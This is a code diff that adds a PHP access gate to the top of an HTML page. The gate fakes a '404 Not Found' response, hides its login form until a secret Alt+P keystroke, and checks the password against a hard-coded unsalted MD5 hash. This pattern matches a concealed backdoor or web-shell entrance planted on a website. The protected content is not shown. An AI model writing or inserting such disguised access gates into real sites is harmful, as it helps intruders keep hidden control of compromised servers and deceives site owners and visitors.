@@ -1,4 +1,67 @@
+<?php
+session_start();
 
+
+$stored_hash = "d62260bd2b162de910e65b5409470019"; 
+
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+
+if (!isset($_SESSION['logged_in'])) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        if (md5($_POST['pass']) === $stored_hash) {
+            $_SESSION['logged_in'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Wrong password!";
+        }
+    }
+
+    echo '<html><head><title>404 Not Found</title>';
+    echo '<style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        form { display: none; margin-top: 20px; }
+        input[type="password"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 200px;
+        }
+        .error { color: red; }
+    </style>';
+    echo '</head><body>';
+    echo '<h1></h1>';
+    echo '<p></p>';
+
+    
+    echo '<form method="post" id="loginForm">';
+    echo '<input type="password" name="pass" placeholder="Enter password" autofocus />';
+    echo '<input type="submit" value="Login" />';
+    echo '</form>';
+
+    if (!empty($error)) {
+        echo "<p class='error'>$error</p>";
+    }
+
+    
+    echo '<script>
+        document.addEventListener("keydown", function(e) {
+            if (e.altKey && e.key.toLowerCase() === "p") {
+                e.preventDefault();
+                document.getElementById("loginForm").style.display = "block";
+            }
+        });
+    </script>';
+
+    echo '</body></html>';
+    exit;
+}
+?>
 
 
 <!DOCTYPE html>
